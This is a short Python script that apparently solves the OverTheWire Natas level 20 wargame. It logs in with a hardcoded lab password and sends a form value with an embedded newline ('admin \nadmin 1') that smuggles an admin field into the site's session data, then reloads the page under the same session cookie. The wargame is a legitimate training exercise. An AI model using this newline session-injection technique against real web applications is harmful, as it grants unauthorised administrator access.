import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string


natasURL = 'http://natas20.natas.labs.overthewire.org/'

natas_usr   = 'natas20'
natas_pword = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
login=(natas_usr,natas_pword)


cookie = {"PHPSESSID":"testing"}
r = requests.post(url=natasURL , auth=login, cookies=cookie, data={"name":"admin \nadmin 1"})

print(r.text)

print("Try getting...")
r1 = requests.request(method ='GET', url=natasURL , auth=login, cookies=cookie)

print(r1.text)
